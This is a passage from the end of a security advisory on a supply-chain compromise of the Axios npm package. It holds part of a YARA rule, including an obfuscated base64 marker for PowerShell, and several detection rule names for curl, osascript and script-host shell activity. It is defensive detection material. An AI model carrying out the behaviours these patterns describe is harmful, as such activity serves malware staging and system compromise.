-$ss7 = "\"d2hlcmUgcG93ZXJzaGVsbA((\".replaceAll(\"(\",\"=\")" ascii wide
-condition:
-uint16(0) != 0x5A4D and filesize < 100KB and all of them
-}
-Google Security Operations (SecOps)
-Google Security Operations (SecOps) customers have access to the following broad category rules and more under the Mandiant Intel Emerging Threats rule pack.
--
-Curl Writing Apple System File to Staging Directory
--
-Node Spawning Nohup Osascript
--
-Node Spawning Windows Script Host With Delete Command
--
-Windows Script Host Spawning Shell With Curl
--
-Windows Terminal In Suspicious Staging Directory
-Wiz
-Wiz customers should check their Wiz Threat Center for information on this advisory and whether or not they are impacted. For more information refer to Wiz’s blog post, [Axios NPM Distribution Compromised in Supply Chain Attack](https://www.wiz.io/blog/axios-npm-compromised-in-supply-chain-attack).</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
